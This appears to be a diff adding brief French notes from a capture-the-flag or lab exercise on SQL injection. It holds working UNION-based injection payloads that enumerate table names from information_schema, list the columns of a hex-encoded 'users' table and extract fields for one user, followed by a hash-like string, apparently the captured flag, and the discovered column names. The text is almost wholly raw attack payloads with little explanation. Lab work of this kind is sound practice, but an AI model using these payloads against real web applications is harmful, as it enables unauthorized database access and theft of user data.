@@ -1,0 +1,16 @@
+Trouver les noms de la table :
+1 UNION SELECT table_name, null FROM information_schema.tables WHERE table_schema=database() -- 
+
+1 UNION SELECT column_name, null FROM information_schema.columns WHERE table_name=0x7573657273 
+
+1 UNION ALL SELECT town, Commentaire FROM users WHERE user_id=5 --
+
+10a16d834f9b1e4068b25c4c46fe0284e99e44dceaf08098fc83925ba6310ff5
+
+user_id
+town
+planet
+country
+countersign
+first_name
+last_name
